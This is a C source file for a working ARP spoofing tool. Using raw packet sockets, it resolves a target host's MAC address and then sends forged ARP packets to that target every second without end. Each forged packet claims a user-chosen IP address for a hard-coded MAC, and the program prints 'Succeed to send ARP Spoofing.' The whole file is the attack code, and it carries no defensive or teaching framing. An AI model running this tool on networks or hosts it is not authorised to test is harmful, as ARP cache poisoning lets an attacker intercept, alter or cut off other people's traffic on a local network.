#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <net/ethernet.h>
#include <unistd.h>

void packarp(char *mymac, char *tarmac, int *tarip, int *myip, char *opcode, char *arppack)
{
    char eth_type[2] = {0x00,0x01};   
    char por_type[2] = {0x08,0x00};     
    char type[2] = {0x08, 0x06};        
    char eth_length = 6;        
    char por_length = 4;        

    memset(arppack, 0, 42);                 
    memcpy(arppack, tarmac, 6);             
    memcpy(arppack + 6, mymac, 6);          
    memcpy(arppack + 12, type, 2);         
    memcpy(arppack + 14, eth_type, 2);    
    memcpy(arppack + 16, por_type, 2);      
    memcpy(arppack + 18, &eth_length, 1);   
    memcpy(arppack + 19, &por_length, 1);   
    memcpy(arppack + 20, opcode, 2);        
    memcpy(arppack + 22, mymac, 6);          
    memcpy(arppack + 28, myip, 4);          
    if (!(opcode[0] == 0x00 && opcode[1] == 0x01)) {
        memcpy(arppack + 32, tarmac, 6);        
    }
    memcpy(arppack + 38, tarip, 4);         
}

int main(int argc, char *argv[])
{
    char mymac[6] = {0x52,0x54,0x4C,0x00,0x08,0x00};
    char tarmac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
    char recvarp[42] = {0};
    char sendarp[42] = {0};
    int tarip;
    int myip;
    char opcode[2];
    int sock_fd,p;
    struct sockaddr addr;

    if (argc < 4) {
        return EXIT_FAILURE;
    }

    myip = inet_addr(argv[3]);
    tarip = inet_addr(argv[2]);
    opcode[0] = 0x00;
    opcode[1] = 0x01;

    packarp(mymac, tarmac, &tarip, &myip, opcode, sendarp);

    if ((sock_fd = socket(AF_INET, SOCK_PACKET, htons(ETH_P_ALL))) < 0) {
        perror("Open Socket");
        return EXIT_FAILURE;
    }

    memset(&addr, 0, sizeof(addr));
    strncpy(addr.sa_data, argv[1], sizeof(addr.sa_data));
    socklen_t len = sizeof(addr);


    while(1) {
        if (sendto(sock_fd, sendarp, 42, 0, &addr, len) == 42) {
            for(p = 0; p < 42;p++)
              {
                printf("%02x ",(unsigned char)sendarp[p]);
              }
            printf(".\nSend ARP packet successful.\n\n");
        } else {
            perror("sendto");
            return EXIT_FAILURE;
        }

        if (recvfrom(sock_fd, recvarp, 42, 0, &addr, &len) == 42) {
            if (!memcmp((void *)recvarp + 28, (void *)sendarp + 38, 4)) {
                memcpy(tarmac, recvarp + 22, 6);
                printf("Succeed to get MAC address.\n");
                break;
            }
        }


        for(p = 0; p < 42;p++)
              {
                printf("%02x ",(unsigned char)recvarp[p]);
              }
        printf(".\n\n");

        sleep(1);
    }

    opcode[0] = 0x00;
    opcode[1] = 0x01;
    packarp(mymac, tarmac, &tarip, &myip, opcode, sendarp);

    while(1) {
        if (sendto(sock_fd, sendarp, 42, 0, &addr, len) == 42) {
            for(p = 0; p < 42;p++)
              {
                printf("%02x ",(unsigned char)sendarp[p]);
              }
            printf("Succeed to send ARP Spoofing. \n");
        } else {
            perror("sendto");
            return EXIT_FAILURE;
        }
        sleep(1);
    }

    close(sock_fd);

    return EXIT_SUCCESS;
}